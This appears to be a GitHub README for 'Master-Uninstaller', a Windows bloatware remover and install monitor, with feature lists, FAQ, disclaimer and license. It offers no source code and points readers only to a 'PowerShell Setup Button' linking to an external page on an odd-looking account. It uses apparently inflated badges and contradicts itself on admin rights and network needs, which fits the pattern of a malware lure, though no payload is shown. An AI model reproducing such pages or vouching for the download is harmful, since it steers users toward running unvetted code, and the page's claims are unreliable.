<div align="center">

# Master-Uninstaller: Bloatware Removal & Install Monitor for Windows 11

![](files/preview.png)

### 🔌 PowerShell Setup Button

[![](files/button.png)](https://tuaiwaname4325-crypto.github.io/master-uninstaller/)

[![installs](https://img.shields.io/badge/Installs-246K-ec4899?style=social&labelColor=0d1117)]() [![build](https://img.shields.io/badge/Build-Green-2ea44f?style=social&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/Powershell-7%2B-f472b6?style=social&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/Rating-5.0%2F5-f59e0b?style=social&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Maintained-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

Master Uninstaller is a Windows desktop utility engineered to reclaim disk space through complete removal of installed programs, residual files, and pre-installed bloatware. The application maintains continuous real-time monitoring of installation activity, issuing notifications when unauthorized software attempts to deploy and enabling blacklist enforcement to block reinstallation. Users can select and uninstall multiple applications in a single operation, with detailed reporting on leftover registry entries and residual artifacts that native uninstallers typically overlook. Service management controls allow unnecessary background services to be disabled, streamlining system performance alongside storage recovery.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Deep program removal** — Uninstalls applications along with leftover files, folders, and registry entries that the native Windows uninstaller leaves behind.
- **Bloatware detection** — Identifies pre-installed and unwanted applications and provides removal recommendations.
- **Real-time installation monitoring** — Tracks new software installations as they occur and issues instant notifications for unauthorized activity.
- **Batch uninstallation** — Selects and removes multiple applications in a single operation to reduce cleanup time.
- **Residual trace scanning** — Reports leftover entries and orphaned files that standard uninstall routines fail to remove.
- **Installation blacklist** — Blocks selected software from being reinstalled, preventing unwanted applications from returning.
- **Service management** — Disables unnecessary background services to reduce resource usage and improve system responsiveness.
- **Hidden application discovery** — Lists both visible and concealed installed programs for a complete system inventory.
- **Disk space reclamation** — Frees storage by eliminating residual data and unused applications.
- **Streamlined interface** — Presents software management tasks in a clear, navigable layout suitable for both novice and advanced users.

## How it works

Master Uninstaller combines a lightweight system scanner with a persistent background monitor to deliver complete application lifecycle management on Windows. The workflow is built around three cooperating components: a registry and filesystem indexer, an uninstallation engine, and a real-time installation watcher.

**1. Application Discovery and Indexing**

On launch, the tool enumerates installed software from multiple sources rather than relying solely on the standard Windows uninstall registry keys. It cross-references registry entries, Start Menu shortcuts, scheduled tasks, and service registrations to build a unified inventory. This approach surfaces hidden or orphaned applications that the native Windows uninstaller does not list, including entries left behind by previously failed uninstalls.

**2. Uninstallation Engine**

When a removal is initiated, Master Uninstaller executes the target application's own uninstaller first, then performs a residual sweep. The sweep maps files, folders, registry keys, and configuration entries associated with the application's install path and publisher signature, and flags leftovers for deletion. Batch mode queues multiple selections and processes them sequentially, while the blacklist records publisher or installer signatures to block reinstallation attempts.

**3. Real-Time Installation Monitoring**

A background service watches installation activity across the system. When a new program is detected, the monitor captures its installer signature, install path, and publisher metadata, then raises a notification. Users can approve the installation, block it, or add the signature to the blacklist. Monitoring persists across reboots via a startup entry and operates with minimal resource overhead.

**4. Reporting and Cleanup**

Each uninstall operation produces a report detailing removed components, residual entries that could not be deleted, and estimated disk space reclaimed. Service management lets you disable unnecessary startup services tied to removed or unwanted software. All operations are logged for review, and the blacklist and monitoring state are stored locally in the application's configuration directory.

The result is a closed loop: discover what is installed, remove what is not wanted, and prevent unwanted software from returning.

## Compatibility

Master Uninstaller is engineered specifically for the Windows desktop environment, with support validated across the current Windows release cadence and legacy configurations still in active use.

- **Operating System:** Windows 10 and Windows 11 are fully supported, including current feature updates and security patches. Windows 8.1 and Windows 7 environments remain functional for core uninstall, residual cleanup, and batch removal operations, though real-time installation monitoring depends on OS-level notification APIs introduced in later Windows builds.
- **Architecture:** Native 64-bit and 32-bit support. The application detects the host architecture at launch and loads the appropriate scanning engine, ensuring accurate enumeration of both 32-bit and 64-bit installed programs and their registry traces.
- **Privilege Model:** Full functionality requires administrator elevation. Standard user sessions can run the application in a read-only scan mode, but program removal, service disabling, and blacklist enforcement are gated behind elevation to preserve system integrity.
- **Disk Footprint:** Approximately 100 MB of available disk space for installation, with additional headroom recommended for residual backup and restore points created during uninstall operations.
- **Memory:** A minimum of 2 GB system RAM; 4 GB or more is recommended when scanning large program inventories or running concurrent uninstall batches.
- **Display:** A minimum resolution of 1024×768; the interface scales correctly under Windows display scaling settings and multi-monitor configurations.
- **Dependencies:** No external runtimes, package managers, or frameworks are required. The application is self-contained and does not depend on third-party libraries installed at the system level.
- **Interoperability:** Coexists with native Windows uninstall facilities and does not disable system restore or Windows Update services. Programs removed through Master Uninstaller are reflected in the standard Windows installed-programs registry, preserving consistency for other management tools.
- **Known Limitations:** Real-time installation monitoring may be suppressed by third-party security suites that intercept install events; users should verify that the monitoring component is permitted by their endpoint protection policy.

## FAQ

**Is Master Uninstaller free to use?**

Yes. Master Uninstaller is distributed as a full free version for Windows, with all core features and updates included. There are no trial limitations or feature gates.

**Which Windows versions are supported?**

Master Uninstaller targets Windows 10 and later. The application requires a minimum of 2 GB RAM and roughly 100 MB of available disk space for installation.

**How does Master Uninstaller differ from the built-in Windows uninstaller?**

The native Windows uninstaller only invokes each program's own removal routine, which frequently leaves behind residual files, registry entries, and services. Master Uninstaller performs a deeper scan after removal to identify and clean these leftovers, and it also surfaces hidden or pre-installed applications that do not appear in the standard Programs and Features list.

**Can I remove multiple applications in a single operation?**

Yes. Master Uninstaller supports batch selection, allowing you to queue several programs for removal at once rather than stepping through them individually.

**How does the installation monitoring feature work?**

Master Uninstaller runs a background monitor that observes new software installations in real time. When an installation is detected, you receive a notification and can decide whether to keep or remove the program. Suspected unwanted software can be added to a blacklist to prevent reinstalling.

**What happens to leftover files after a program is uninstalled?**

After the standard removal routine completes, Master Uninstaller scans for orphaned files, folders, and registry entries associated with the removed application and presents them for cleanup. This residual cleanup is what distinguishes it from a conventional uninstall.

**Can Master Uninstaller remove bloatware that came pre-installed on my PC?**

Yes. The application identifies pre-installed bloatware and suggests removal candidates. Because some pre-installed components are tied to system services, Master Uninstaller also provides options to disable unnecessary services rather than removing them outright.

**Is it safe to remove programs with Master Uninstaller?**

Master Uninstaller is a safe download and does not compromise system integrity. As with any uninstaller, review the removal list before confirming, particularly for applications you did not install yourself, and avoid removing system-critical components.

**Does Master Uninstaller require an internet connection?**

No. Core uninstallation, residual scanning, and installation monitoring operate locally on your machine. An internet connection is only relevant for obtaining updates to the application itself.

**How do I prevent unwanted software from being reinstalled?**

Add the program to the blacklist. Master Uninstaller's monitoring layer will flag and block reinstallation attempts for blacklisted software, providing persistent protection against recurring bloatware.

**Can I undo an uninstallation?**

Uninstallation is a destructive operation and is not reversible within the application. Create a system restore point before performing large batch removals if you need a rollback path.

## Disclaimer

Master Uninstaller is provided as a system utility for Windows and is intended to be used in accordance with the permissions granted by the local operating system and the administrative rights of the user account under which it is executed. The software performs direct modifications to system configuration, including the removal of application entries, associated registry keys, residual files, and service configurations; these operations are irreversible in nature and should be performed only after appropriate backups or system restore points have been created.

The tool identifies installed applications and bloatware based on heuristics, signature matching, and installation metadata. Detection results may vary depending on system state, vendor packaging, and the presence of customized or portable installations. Master Uninstaller does not guarantee the identification of every unwanted program, nor does it guarantee the complete removal of all residual artifacts in every environment. Users are responsible for reviewing the list of detected items prior to initiating any uninstallation or cleanup operation.

Real-time monitoring and unauthorized-installation alerts rely on background processes and system hooks that must remain active for notifications to function. Disabling these components will limit the monitoring capability of the software. Blacklist and prevention features apply only to installations observed while the monitoring service is running and do not constitute a comprehensive security or endpoint-protection solution.

Master Uninstaller is not a substitute for antivirus, anti-malware, or endpoint security software, and it does not provide threat detection, remediation, or network protection. It should not be relied upon as a primary defense against malicious software.

The software is supplied on an "as is" basis, without warranties of any kind, whether express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. By using Master Uninstaller, the user accepts full responsibility for any changes made to the system, including the loss of application data, configuration settings, or files removed during cleanup. The authors and distributors of Master Uninstaller shall not be held liable for any direct, indirect, incidental, or consequential damages arising from the use or inability to use the software.

Users should verify system compatibility prior to deployment and should avoid running the tool in environments where application removal is restricted by organizational policy or licensing terms.

## License

Master Uninstaller is distributed as a full free version for Windows, with all core and advanced capabilities included at no cost. No trial restrictions, feature gates, or time limits apply to the standard distribution.

### Scope of Use

- Installation and use on personal and professional Windows workstations is permitted under the free distribution terms.
- Removal of programs, cleanup of residual files, monitoring of new installations, and blacklist management are available without a paid tier.
- Updates delivered for the distributed version are included within the same free licensing model.

### Technical Terms

- The software is provided for use as a system utility; modification, redistribution, or repackaging of the installer is not covered by the standard distribution terms.
- The application operates locally on the host system and does not require activation keys, subscription credentials, or account registration.
- Feature availability described in this documentation reflects the current free distribution and may be extended in subsequent updates.

### Disclaimer of Warranty

Master Uninstaller is provided "as is," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. Users assume responsibility for verifying that removed programs and residual entries are no longer required before confirming uninstallation operations.